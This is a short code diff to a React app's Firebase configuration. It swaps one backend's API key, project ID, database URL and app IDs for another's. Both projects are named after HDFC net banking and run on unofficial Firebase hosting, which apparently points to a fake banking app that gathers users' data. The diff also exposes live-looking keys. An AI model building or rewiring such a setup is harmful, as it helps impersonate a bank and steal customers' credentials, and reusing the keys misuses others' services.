@@ -6,13 +6,13 @@ import { useNavigate } from 'react-router-dom';
 
 // Firebase configuration
 const firebaseConfig = {
-  apiKey: "AIzaSyBms0ivDA4HmDqwoX25Pq-624QSowjYrzU",
-  authDomain: "moon-night-hdfc-net-banking2.firebaseapp.com",
-  projectId: "moon-night-hdfc-net-banking2",
-  databaseURL: "https://moon-night-hdfc-net-banking2-default-rtdb.firebaseio.com",
-  storageBucket: "moon-night-hdfc-net-banking2.appspot.com",
-  messagingSenderId: "928200284162",
-  appId: "1:928200284162:android:90b291f183d89a7811ef1b"
+  apiKey: "AIzaSyCfVVXJr6lUE_8EOg6JepQI0MoQrRLRT5M",
+  authDomain: "hdfc-net-banking-jt-to-ss.firebaseapp.com",
+  projectId: "hdfc-net-banking-jt-to-ss",
+  databaseURL: "https://hdfc-net-banking-jt-to-ss-default-rtdb.firebaseio.com",
+  storageBucket: "hdfc-net-banking-jt-to-ss.appspot.com",
+  messagingSenderId: "147517984060",
+  appId: "1:147517984060:android:ef47c2bd04a1b7c6062239"
 };
 
 // Initialize Firebase
